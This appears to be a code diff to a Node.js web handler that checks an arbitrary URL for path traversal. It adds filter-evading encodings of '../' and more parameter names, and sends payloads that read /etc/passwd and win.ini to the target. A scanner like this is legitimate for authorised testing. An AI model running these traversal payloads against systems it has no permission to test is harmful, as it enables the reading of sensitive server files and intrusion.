@@ -15,6 +15,17 @@ const axiosInstance = axios.create({
     }
 });
 
+// 生成多种编码的 payload
+function encodePayload(payload) {
+    const encoded = [];
+    encoded.push(payload);
+    encoded.push(encodeURIComponent(payload));
+    encoded.push(payload.replace(/\.\.\//g, '%2e%2e%2f'));
+    encoded.push(payload.replace(/\.\.\//g, '..%2f'));
+    encoded.push(payload.replace(/\.\.\//g, '%2e%2e/'));
+    return encoded;
+}
+
 module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -27,18 +38,22 @@ module.exports = async (req, res) => {
     let targetUrl = url;
     if (!/^https?:\/\//i.test(targetUrl)) targetUrl = 'https://' + targetUrl;
 
-    const payloads = ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini'];
-    const testParams = ['file', 'path', 'page'];
+    const basePayloads = ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini'];
+    const testParams = ['file', 'path', 'page', 'dir', 'document', 'folder', 'root', 'path'];
+
     for (const param of testParams) {
-        for (const payload of payloads) {
-            const testUrl = new URL(targetUrl);
-            testUrl.searchParams.set(param, payload);
-            try {
-                const res = await axiosInstance.get(testUrl.href, { timeout: 3000 });
-                if (res.data.includes('root:') || res.data.includes('[extensions]')) {
-                    return res.json({ vulnerable: true, param, payload, url: testUrl.href });
-                }
-            } catch (e) {}
+        for (const base of basePayloads) {
+            const payloads = encodePayload(base);
+            for (const payload of payloads) {
+                const testUrl = new URL(targetUrl);
+                testUrl.searchParams.set(param, payload);
+                try {
+                    const resData = await axiosInstance.get(testUrl.href, { timeout: 3000 });
+                    if (resData.data.includes('root:') || resData.data.includes('[extensions]')) {
+                        return res.json({ vulnerable: true, param, payload, url: testUrl.href });
+                    }
+                } catch (e) {}
+            }
         }
     }
     res.json({ vulnerable: false });
